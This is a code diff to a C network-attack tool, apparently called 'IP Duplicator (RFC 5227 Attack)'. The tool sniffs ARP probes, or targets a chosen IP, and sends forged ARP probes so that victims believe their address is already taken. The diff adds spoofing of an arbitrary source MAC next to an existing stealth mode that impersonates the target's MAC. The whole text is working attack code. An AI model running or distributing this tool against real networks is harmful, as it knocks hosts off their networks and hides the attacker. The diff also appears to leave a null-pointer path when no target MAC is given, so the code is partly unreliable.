@@ -1,6 +1,6 @@
 /*
- * RFC 5227 Attack
- * ml5227.c
+ * IP Duplicator (RFC 5227 Attack)
+ * ipdup.c
  *
  * Written by Michael Laforest
  * Feb 2015
@@ -59,6 +59,7 @@
 #define FLAG_LISTEN		0x01
 #define FLAG_CONT		0x02
 #define FLAG_STEALTH	0x04
+#define FLAG_SOURCEMAC	0x08
 #define IS_SET(v)		((g_flags & v) == v)
 
 struct arp_t {
@@ -77,17 +78,19 @@ char* g_netdev;
 pcap_t* g_pcap_handle;
 int g_flags = 0;
 
-void sniff(double probability);
+void sniff(double probability, char* smac);
 void send_arp_probe(struct arp_t* arp);
-void attack(char* ip, char* mac, char* sdelay);
+void attack(char* ip, char* mac, char* smac, char* sdelay);
+int parse_mac(char* dst, char* str);
 
 int main(int argc, char** argv) {
 	char* target_ip = NULL;
 	char* target_mac = NULL;
+	char* source_mac = "DE:AD:BE:EF:00:00";
 	char* attack_delay = "0";
 	char* attack_prob = "1.0";
 
-	printf("5227 Attack v0.2\n"
+	printf("5227 Attack v0.3\n"
 			"Written by: Michael Laforest\n"
 			"Feb 2015\n"
 			"\n"
@@ -96,6 +99,7 @@ int main(int argc, char** argv) {
 			"-l\tListen mode. Listen for ARP probes and attack the source host.\n"
 			"-t\tTarget mode. Send ARP probes to the host at this IP address.\n"
 			"-S\tStealth. Use the target's MAC as our source MAC.\n"
+			"-M\tSpecify the source MAC address to use. (default DE:AD:BE:EF:00:00)\n"
 			"-m\t(Target mode only) Specify the MAC address of the target host. (fmt: AA:BB:CC:DD:EE:FF)\n"
 			"-c\t(Target mode only) Continuously attack the target as opposed to just once.\n"
 			"-d\t(Target mode only) Delay attacks by msec microseconds.\n"
@@ -105,7 +109,7 @@ int main(int argc, char** argv) {
 
 	int c = 0;
 	for (;;) {
-		c = getopt(argc, argv, "t:ld:p:m:cS");
+		c = getopt(argc, argv, "t:ld:p:m:cSM:");
 		if (c == -1)
 			break;
 
@@ -115,6 +119,10 @@ int main(int argc, char** argv) {
 				break;
 			case 'm':
 				target_mac = strdup((char*)optarg);
+				break;
+			case 'M':
+				source_mac = strdup((char*)optarg);
+				g_flags |= FLAG_SOURCEMAC;
 				break;
 			case 'd':
 				attack_delay = strdup((char*)optarg);
@@ -140,6 +148,10 @@ int main(int argc, char** argv) {
 	}
 	if (!target_ip && !(IS_SET(FLAG_LISTEN))) {
 		printf("Select an attack type.\n");
+		return 0;
+	}
+	if (IS_SET(FLAG_STEALTH) && IS_SET(FLAG_SOURCEMAC)) {
+		printf("-S and -M are mutually exclusive.\n");
 		return 0;
 	}
 
@@ -178,14 +190,14 @@ int main(int argc, char** argv) {
 			printf("[ERROR] '%s' is not a valid probability (0.0 <= x <= 1.0)\n", attack_prob);
 			return 1;
 		}
-		sniff(p);
+		sniff(p, source_mac);
 	} else if (target_ip)
-		attack(target_ip, target_mac, attack_delay);
+		attack(target_ip, target_mac, source_mac, attack_delay);
 
 	return 0;
 }
 
-void sniff(double probability) {
+void sniff(double probability, char* smac) {
 	char ebuf[PCAP_ERRBUF_SIZE]; 
 	const u_char* packet;
 	struct pcap_pkthdr h;
@@ -229,8 +241,12 @@ void sniff(double probability) {
 			printf(" ARP is a reply\n");
 			continue;
 		}
-		if (!memcmp(arp->s_mac, "\x11\x22\x33\x44\x55\x66", 6)) {
-			printf(" ARP packet came from us\n");
+
+		char test[6] = {0};
+		if (!parse_mac(test, smac))
+			return;
+		if (!memcmp(arp->s_mac, test, 6)) {
+			printf(" ARP packet came from our source MAC\n");
 			continue;
 		}
 
@@ -266,8 +282,9 @@ void sniff(double probability) {
 		evil_arp.plen = 4;
 		evil_arp.op = htons(1);
 
-		
-		memcpy(evil_arp.s_mac, "\x11\x22\x33\x44\x55\x66", 6);
+		if (!parse_mac(evil_arp.s_mac, smac))
+			return;
+
 		memcpy(evil_arp.s_ip, "\x00\x00\x00\x00", 4);
 		memcpy(evil_arp.d_mac, arp->s_mac, 6);
 		memcpy(evil_arp.d_ip, arp->d_ip, 4);
@@ -323,7 +340,7 @@ void send_arp_probe(struct arp_t* arp) {
 }
 
 
-void attack(char* ip, char* mac, char* sdelay) {
+void attack(char* ip, char* dmac, char* smac, char* sdelay) {
 	int delay = 0;
 	
 	if (sdelay)
@@ -342,21 +359,13 @@ void attack(char* ip, char* mac, char* sdelay) {
 	evil_arp.plen = 4;
 	evil_arp.op = htons(1);
 
-	memcpy(evil_arp.s_mac, "\x11\x22\x33\x44\x55\x66", 6);
 	memcpy(evil_arp.s_ip, "\x00\x00\x00\x00", 4);
 	memcpy(evil_arp.d_ip, &d_ip.s_addr, 4);
 
-	if (mac) {
-		int r = sscanf(mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-						&evil_arp.d_mac[0], &evil_arp.d_mac[1], &evil_arp.d_mac[2],
-						&evil_arp.d_mac[3], &evil_arp.d_mac[4],	&evil_arp.d_mac[5]);
-		if (r == 0) {
-			printf("[ERROR] '%s' is not a valid MAC address.\n", mac);
-			return;
-		}
-	} else {
-		memcpy(evil_arp.d_mac, "\xDE\xAD\xBE\xEF\x01\x02", 6);
-	}
+	if (!parse_mac(evil_arp.d_mac, dmac))
+		return;
+	if (!parse_mac(evil_arp.s_mac, smac))
+		return;
 
 	do {
 		printf("\n");
@@ -367,4 +376,16 @@ void attack(char* ip, char* mac, char* sdelay) {
 			usleep(delay);
 
 	} while (IS_SET(FLAG_CONT));
+}
+
+
+int parse_mac(char* dst, char* str) {
+	int r = sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+					dst, dst+1, dst+2,
+					dst+3, dst+4,	dst+5);
+	if (r == 0) {
+		printf("[ERROR] '%s' is not a valid MAC address.\n", str);
+		return 0;
+	}
+	return 1;
 }
